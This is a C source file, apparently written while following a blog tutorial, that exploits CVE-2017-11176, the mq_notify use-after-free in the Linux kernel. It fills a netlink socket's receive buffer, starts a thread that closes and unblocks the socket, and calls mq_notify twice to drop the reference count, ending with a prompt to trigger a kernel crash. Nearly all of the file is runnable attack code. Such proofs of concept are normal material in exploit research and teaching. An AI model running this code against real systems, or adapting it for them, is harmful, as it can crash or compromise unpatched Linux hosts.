
// https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part2.htm

/* Aim
//  msg->msg_flags doesn't have the MSG_OOB flag
//  msg->msg_controllen equals 0
//  msg->msg_namelen is different from zero
//  msg->msg_name->nl_family equals AF_NETLINK
//  msg->msg_name->nl_groups equals 0
//  msg->msg_name->nl_pid is different from 0 and points to the receiver socket
//  the sender netlink socket must use the NETLINK_USERSOCK protocol
//  msg->msg_iovlen equals 1
//  msg->msg_iov is a readable userland address
    msg->msg_iov->iov_len is lesser than or equals to sk_sndbuf minus 32
//  msg->msg_iov->iov_base is a readable userland address

    msg->msg_flags has the MSG_DONTWAIT flag set
//  the receiver netlink socket must be bound prior calling sendmsg()
//  the receiver netlink socket must use the NETLINK_USERSOCK protocol
    don't define any BPF filter for the receiver socket
*/
//gcc -lrt -pthread exploit.c -o exploit

#define _GNU_SOURCE
#include <sys/syscall.h>
#include <unistd.h>
#include <mqueue.h>
#include <signal.h>
#include <stdlib.h>
#include <stdio.h>
#include <asm/types.h>
#include <sys/socket.h>
#include <linux/netlink.h>
#include <errno.h>

#define _mq_notify(mqdes, sevp) syscall(__NR_mq_notify, mqdes, sevp)
#define _socket(domain, type, protocol) syscall(__NR_socket, domain, type, protocol)
#define _setsockopt(socket, level, option_name, option_value, option_len) syscall(__NR_setsockopt, socket, level, option_name, option_value, option_len)
#define _close(fd) syscall(__NR_close, fd)              
#define _dup(oldfd) syscall(__NR_dup, oldfd)  
#define _bind(sockfd, addr, addrlen) syscall(__NR_bind, sockfd, addr, addrlen)
#define _sendmsg(socket, message, flags) syscall(__NR_sendmsg, socket, message, flags)
#define _getsockopt(socket, level, option_name, option_value, option_len) syscall(__NR_getsockopt, socket, level, option_name, option_value, option_len)

struct thread_data
{
    int blockFD;
    int sockFD;
};

void* unblock(void *threadVar)
{
    sleep(5);
    struct thread_data* my_data = (struct thread_data*) threadVar;
    int blockFD = my_data->blockFD;
    int sockFD = my_data->sockFD;
    if(_close(sockFD) != 0)
    {
        perror("close");
    }
    printf("[unblock] closed fd %d\n", sockFD);

    int val = 55;
    printf("[unblock] about to unblock\n");
    if(_setsockopt(blockFD, SOL_NETLINK, NETLINK_NO_ENOBUFS, &val, sizeof(val)))
        perror("setsockopt");
}

//to statisfy the condition: (sk_rmem_alloc > sk_rcvbuf)
int fill_receive_buffer()
{
       int sendFD, receiveFD;

    if ((sendFD = _socket(AF_NETLINK, SOCK_RAW, NETLINK_USERSOCK)) < 0)
    {
        perror("socket");
        return -1;
    }
    if ((receiveFD = _socket(AF_NETLINK, SOCK_RAW, NETLINK_USERSOCK)) < 0)
    {
        perror("socket");
        return -1;
    }

    int sendbuffSize;
    socklen_t optlen = sizeof(sendbuffSize);
    if( _getsockopt(sendFD, SOL_SOCKET, SO_SNDBUF, &sendbuffSize, &optlen))
    {
        perror("getsockopt");
        return -1;
    }
    //printf("%d\n", sendbuffSize); // 212992 or using System Tap : 212992
    char buffer[sendbuffSize - 32];
    
    struct sockaddr_nl sockAddress = {
        .nl_family = AF_NETLINK,
        .nl_pad = 0,
        .nl_pid = 144,
        .nl_groups = 0
    };
    struct iovec iov = {
    .iov_base = buffer,
    .iov_len = sizeof(buffer)
    };
    struct msghdr messageHeader = {
    .msg_name = &sockAddress,
    .msg_namelen = sizeof(sockAddress),
    .msg_iov = &iov,
    .msg_iovlen = 1,
    .msg_control = NULL,
    .msg_controllen = 0,
    .msg_flags = 0, 
    };

    while(_bind(receiveFD, (struct sockaddr *)&sockAddress, sizeof(sockAddress)))
    {
        if(errno == EADDRINUSE)
        {
            sockAddress.nl_pid ++;
        }else{
            perror("bind");
            return -1;
        }
    }
    while(_sendmsg(sendFD, &messageHeader, MSG_DONTWAIT) > 0);
    if(errno != EAGAIN)
    {
        perror("sendmsg");
        return -1;
    }
    if(_close(sendFD) != 0)
    {
        perror("close");
        return -1;
    }

    printf("[main] filled the receiver buffer :: condition (sk_rmem_alloc > sk_rcvbuf)\n");

    return receiveFD;
}

int decrease_refCount(int sockFD, int blockFD)
{
    struct sigevent sevp;
    char* buf;
    buf = (char *)malloc(32*sizeof(char));
   //int sockFD;
   /* int sockFD = _socket(AF_NETLINK, SOCK_RAW ,NETLINK_GENERIC);
    if(sockFD < 0)
    {
        perror("socket");
        return -1;
    }*/

    struct thread_data th_data;
    th_data.sockFD = sockFD;
    th_data.blockFD = blockFD;
    
    pthread_t thread;
    if(pthread_create(&thread, NULL, &unblock, (void *) &th_data))
    {
        perror("pthread_create");
        return -1;
    }
    printf("[main] created unblock thread\n");

    sevp.sigev_notify = SIGEV_THREAD;
    sevp.sigev_value.sival_ptr = buf;
    sevp.sigev_signo = sockFD;

    mqd_t mqdes = (mqd_t) -1; // ??
    
   // printf("%p\n", &sevp);
    printf("[main] about to get blocked\n");
    //  On success mq_notify() returns 0; on error, -1 is returned, with errno set to indicate the error.
    if(_mq_notify(mqdes, &sevp)== -1 || errno != EBADF )
    {
        printf("[main] mq_notify succeed\n");
        return 0;
    }
    else
    {
        perror("mq_notify SysCall");
        printf("call failed\n");
        return -1;
    }
    return 0;
}
int main()
{
    int sockFD;
    int sockFD2;
    int blockFD;

    if((sockFD = fill_receive_buffer()) == -1)
    {
        perror("fill receive buffer");
        return -1;
    }

    if(((blockFD = _dup(sockFD)) < 0) || ((sockFD2 = _dup(sockFD)) < 0) )
    {
        perror("dup");
        return -1;
    }

    if(decrease_refCount(sockFD, blockFD) || decrease_refCount(sockFD2, blockFD))
    {
        return -1;
    }


    printf("[main] ready to crash?\n");
    do { 
        printf("[main] press key to continue...\n"); 
        getchar(); 
    } while(0);

    return 0;


}
